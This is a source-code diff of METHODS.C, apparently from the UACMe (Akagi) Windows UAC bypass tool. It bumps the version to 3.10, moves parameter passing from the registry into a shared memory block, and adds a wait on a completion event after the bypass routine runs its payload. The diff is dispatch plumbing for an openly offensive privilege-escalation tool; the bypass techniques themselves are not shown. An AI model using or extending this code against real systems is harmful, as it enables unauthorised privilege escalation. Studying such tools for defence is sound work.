@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.04
+*  VERSION:     3.10
 *
-*  DATE:        10 Nov 2018
+*  DATE:        11 Nov 2018
 *
 *  UAC bypass dispatch.
 *
@@ -281,24 +281,6 @@ BOOL IsMethodMatchRequirements(
         }
     }
 #endif
-    //
-    // Set shared registry parameters.
-    //
-    //   1. Execution parameters (flag, session id, winstation\desktop)
-    //   2. Optional parameter from Akagi command line.
-    //
-    if (Entry->SetParametersInRegistry) {
-
-        supSaveAkagiParameters();
-
-        if (g_ctx.OptionalParameterLength != 0) {
-            supSetParameter(
-                (LPWSTR)&g_ctx.szOptionalParameter,
-                (DWORD)(g_ctx.OptionalParameterLength * sizeof(WCHAR))
-            );
-        }
-    }
-
     return TRUE;
 }
 
@@ -340,7 +322,7 @@ BOOL MethodsManagerCall(
     _In_ UCM_METHOD Method
 )
 {
-    BOOL   bResult;
+    BOOL   bResult, bParametersBlockSet = FALSE;
     ULONG  PayloadSize = 0, DataSize = 0;
     PVOID  PayloadCode = NULL, Resource = NULL;
     PVOID  ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
@@ -348,6 +330,7 @@ BOOL MethodsManagerCall(
     PUCM_EXTRA_CONTEXT ExtraContext;
     
     UCM_PARAMS_BLOCK ParamsBlock;
+    LARGE_INTEGER liDueTime;
 
     if (Method >= UacMethodMax)
         return FALSE;
@@ -394,11 +377,48 @@ BOOL MethodsManagerCall(
     ParamsBlock.PayloadCode = PayloadCode;
     ParamsBlock.PayloadSize = PayloadSize;
 
+    //
+    // Set shared parameters.
+    //
+    //   1. Execution parameters (flag, session id, winstation\desktop)
+    //   2. Optional parameter from Akagi command line.
+    //
+    if (Entry->SetParameters) {
+        //
+        // Special case for dotnet unit.
+        // Reimplementation pending.
+        //
+        if (Entry->PayloadResourceId == FUJINAMI_ID) {
+            if (g_ctx.OptionalParameterLength != 0) {
+                supSetParameter(
+                    (LPWSTR)&g_ctx.szOptionalParameter,
+                    (DWORD)(g_ctx.OptionalParameterLength * sizeof(WCHAR))
+                );
+            }
+        }
+        else {
+            bParametersBlockSet = supCreateSharedParametersBlock();
+        }
+    }
+
     bResult = (BOOL)Entry->Routine(&ParamsBlock);
 
     if (PayloadCode) {
         RtlSecureZeroMemory(PayloadCode, PayloadSize);
         supVirtualFree(PayloadCode, NULL);
+    }
+
+    //
+    // Wait a little bit for completion.
+    //
+    if (Entry->SetParameters) {
+        if (bParametersBlockSet) {           
+            if (g_ctx.SharedContext.hCompletionEvent) {
+                liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(200000, 10000);
+                NtWaitForSingleObject(g_ctx.SharedContext.hCompletionEvent, FALSE, &liDueTime);
+            }
+            supDestroySharedParametersBlock();
+        }
     }
     return bResult;
 }
